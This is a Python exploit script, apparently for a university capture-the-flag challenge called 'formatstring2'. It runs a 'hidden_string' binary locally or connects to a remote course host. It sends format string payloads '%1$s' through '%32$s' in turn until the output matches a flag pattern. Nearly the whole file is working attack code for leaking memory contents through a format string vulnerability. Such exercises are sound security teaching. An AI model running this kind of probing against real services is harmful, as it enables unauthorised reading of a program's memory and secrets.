#!/usr/bin/env python3
"""
formatstring2 helper.

Default use:
    python exploit.py

Local mode:
    python exploit.py --mode local
"""

from __future__ import annotations

import argparse
import os
import re
import select
import socket
import subprocess
import time
from pathlib import Path


SCRIPT_DIR = Path(__file__).resolve().parent
FORMATSTRING_DIR = SCRIPT_DIR.parent / "formatstring2"
DEFAULT_BINARY = str(FORMATSTRING_DIR / "hidden_string")
DEFAULT_HOST = "moa6.eecs.utk.edu"
DEFAULT_PORT = 32110
DEFAULT_PAYLOAD = "auto"

FLAG_RE = re.compile(r"cosc[0-9-]*-flag-\{[^}]+\}", re.IGNORECASE)
GENERIC_FLAG_RE = re.compile(r"\b[a-z][a-z0-9_-]{1,32}\{[^}\n]{4,128}\}", re.IGNORECASE)
READY_TIMEOUT = 4.0
IDLE_TIMEOUT = 0.25


def _read_local_idle(
    proc: subprocess.Popen[bytes], timeout: float = READY_TIMEOUT
) -> str:
    if proc.stdout is None or proc.stdout.closed:
        raise RuntimeError("Failed to open subprocess stdout")
    out = b""
    fd = proc.stdout.fileno()
    deadline = time.monotonic() + timeout
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        ready, _, _ = select.select([fd], [], [], min(IDLE_TIMEOUT, remaining))
        if not ready:
            if out:
                break
            continue
        chunk = os.read(fd, 4096)
        if not chunk:
            break
        out += chunk
    return out.decode(errors="replace")


def _read_remote_idle(sock: socket.socket, timeout: float = READY_TIMEOUT) -> str:
    out = b""
    deadline = time.monotonic() + timeout
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        sock.settimeout(min(IDLE_TIMEOUT, remaining))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            if out:
                break
            continue
        if not chunk:
            break
        out += chunk
    return out.decode(errors="replace")


def build_payload(payload: str) -> bytes:
    if not payload.endswith("\n"):
        payload += "\n"
    return payload.encode()


def _looks_like_success(text: str) -> bool:
    return bool(FLAG_RE.search(text) or GENERIC_FLAG_RE.search(text))


def _run_local_once(binary: str, payload: str) -> str:
    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=str(FORMATSTRING_DIR),
    )

    if proc.stdin is None or proc.stdout is None:
        raise RuntimeError("Failed to open subprocess pipes")

    pre = _read_local_idle(proc)

    proc.stdin.write(build_payload(payload))
    proc.stdin.flush()
    proc.stdin.close()

    rest = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
    try:
        proc.wait(timeout=2)
    except subprocess.TimeoutExpired:
        proc.kill()

    return pre + rest


def run_local(binary: str, payload: str) -> None:
    if payload != "auto":
        print(_run_local_once(binary, payload), end="")
        return

    for idx in range(1, 33):
        candidate = f"%{idx}$s"
        out = _run_local_once(binary, candidate)
        print(f"[*] try payload={candidate}")
        if _looks_like_success(out):
            print(out, end="")
            return
    raise RuntimeError("auto mode failed to find working string-leak offset")


def _run_remote_once(host: str, port: int, payload: str) -> str:
    with socket.create_connection((host, port), timeout=5.0) as sock:
        pre = _read_remote_idle(sock)
        sock.sendall(build_payload(payload))
        post = _read_remote_idle(sock, timeout=5.0)
        return pre + post


def run_remote(host: str, port: int, payload: str) -> None:
    if payload != "auto":
        print(_run_remote_once(host, port, payload), end="")
        return

    for idx in range(1, 33):
        candidate = f"%{idx}$s"
        out = _run_remote_once(host, port, candidate)
        print(f"[*] try payload={candidate}")
        if _looks_like_success(out):
            print(out, end="")
            return
    raise RuntimeError("auto mode failed to find working string-leak offset")


def main() -> None:
    parser = argparse.ArgumentParser(description="formatstring2 helper")
    parser.add_argument(
        "--mode",
        choices=["local", "remote"],
        default="local",
        help="target mode (default: local)",
    )
    parser.add_argument("--binary", default=DEFAULT_BINARY)
    parser.add_argument(
        "--host", default=DEFAULT_HOST, help="remote host (used when --mode remote)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help="remote port (used when --mode remote)",
    )
    parser.add_argument(
        "--payload",
        default=DEFAULT_PAYLOAD,
        help="format payload (default: auto, probes %%1$s..%%32$s)",
    )
    args = parser.parse_args()

    if args.mode == "local":
        run_local(args.binary, args.payload)
    else:
        run_remote(args.host, args.port, args.payload)


if __name__ == "__main__":
    main()
